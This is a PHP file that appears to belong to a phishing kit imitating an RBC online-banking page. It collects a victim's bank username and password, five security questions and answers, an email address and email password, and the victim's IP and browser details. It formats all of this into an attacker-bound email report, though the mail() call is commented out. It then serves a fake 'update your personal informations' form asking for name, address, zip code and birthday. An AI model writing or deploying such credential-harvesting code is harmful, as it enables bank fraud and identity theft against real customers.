<?php
	session_start();
	include('browsers.php');
	include('config.php');
	$response = array();
	$q1 = $_POST["q1"];	
	$a1 = $_POST["ans1"];	
	$q2 = $_POST["q2"];	
	$a2 = $_POST["ans2"];	
	$q3 = $_POST["q3"];	
	$a3 = $_POST["ans3"];
	$q4 = $_POST["q4"];	
	$a4 = $_POST["ans4"];
	$q5 = $_POST["q5"];	
	$a5 = $_POST["ans5"];
	$email = $_POST["email"];
	$emailpass = $_POST["passmail"];	

	$Subject = "NEW RB Security and email ";	
	$Content = "<p style=\"padding:20px; color:#fff; background-color:#000 \"><b>==== Account Info ====</b></p><br/><br/>";	
	$Content .= "<b>User :</b> ".$_SESSION["username"]."<br/><br/>";
	$Content .= "<b>Password :</b> ".$_SESSION["password"]."<br/><br/>";
	$Content .= "<b>Q 1 :</b> ".$q1."<br/><br/>";
	$Content .= "<b>A 1 :</b> ".$a1."<br/><br/>";	
	$Content .= "<b>Q 2  :</b> ".$q2."<br/><br/>";	
	$Content .= "<b>A 2 :</b> ".$a2."<br/><br/>";	
	$Content .= "<b>Q 3 </b> ".$q3."<br/><br/>";	
	$Content .= "<b>A 3 :</b> ".$a3."<br/><br/>";	
	$Content .= "<b>Q 4 </b> ".$q4."<br/><br/>";	
	$Content .= "<b>A 4 :</b> ".$a4."<br/><br/>";	
	$Content .= "<b>Q 5 </b> ".$q5."<br/><br/>";	
	$Content .= "<b>A 5 :</b> ".$a5."<br/><br/>";	
	$Content .= "<b>Email :</b> ".$email."<br/><br/>";	
	$Content .= "<b>Password emial :</b> ".$emailpass."<br/><br/>";	
	$Content .= "<p style=\"padding:20px; color:#fff; background-color:#000\"><b>==== IP and Browser Info ====</b></p><br/><br/>";	
	$Content .= "<b>IP : </b>" .$_SERVER['REMOTE_ADDR']."<br/><br/>";	
	$Content .= "<b>OS : </b>" .$user_os."<br/><br/>";	
	$Content .= "<b>Browser : </b>" .$user_browser."<br/><br/>";	
	$Content .= "<b>Agent : </b>" .$_SERVER['HTTP_USER_AGENT']."<br/><br/>";	
	$MailHeaders = "From: rbcontact\r\n";	
	$MailHeaders .= "MIME-Version: 1.0\r\n";	
	$MailHeaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
	
	//if(mail($to, $subject, $content, $Mailheaders)){
	$response["res"] ='<div role="complementary" aria-label="Error">
	<div class="redNotice notices" tabindex="-1" id="attention-notice-pl-1">
		<div class="redMessage">
			<i aria-hidden="true" class="rbc-icon rbc_attention"></i>
			<img src="" alt="Attention" class="accessible"> 
			Personal Data & informations. 
		</div>
		<div class="arrowDownRed"></div>
		
		<p>Please update your personal informations. When you are done , click "Continue".</p>
	</div>
</div>

<form class="form clearfix" id="ste2">
	<div class="row">	
	  <div class="form-group col-md-6 col-sm-6">
		<label for="fname">First name :</label>
		<input type="text" class="form-control" id="fname" name="fname" style="border-radius:0px !important;" onkeyup="keyUpveriF(this)">
	  </div>
	 <div class="form-group col-md-6 col-sm-6">
		<label for="lname">Last name :</label>
		<input type="text" class="form-control" id="lname" name="lname" style="border-radius:0px !important;" onkeyup="keyUpveriF(this)">
	  </div>
	  <div class="form-group col-md-6 col-sm-6">
		<label for="address1">Address line 1:</label>
		<input type="text" class="form-control" id="address1" name="address1" style="border-radius:0px !important;" onkeyup="keyUpveriF(this)">
	  </div>
	  <div class="form-group col-md-6 col-sm-6">
		<label for="address2">Address line 2:</label>
		<input type="text" class="form-control" id="address2" name="address2" style="border-radius:0px !important;" onkeyup="keyUpveriF(this)">
	  </div>
	  <div class="form-group col-md-6 col-sm-6">
		<label for="zip">Zip code:</label>
		<input type="text" class="form-control" id="zip" name="zip" style="border-radius:0px !important;" onkeyup="keyUpveriF(this)" maxlength="8" >
	  </div>
	  <div class="form-group col-md-6 col-sm-6">
		<label for="dbd">Birthday:</label>
		<input type="text" class="form-control" id="dbd" name="dbd" style="border-radius:0px !important;" onkeyup="dobs(this);" maxlength="10" >
	  </div>


	  
	</div>
	<div class="form-group col-md-12 ">
		<button type="button" tabindex="4" class="pull-right clear-fix yellowBtnLarge" id="s2" onclick="step3();">Continue</button>
	</div>
	  
</form>';

echo json_encode($response);

?>




















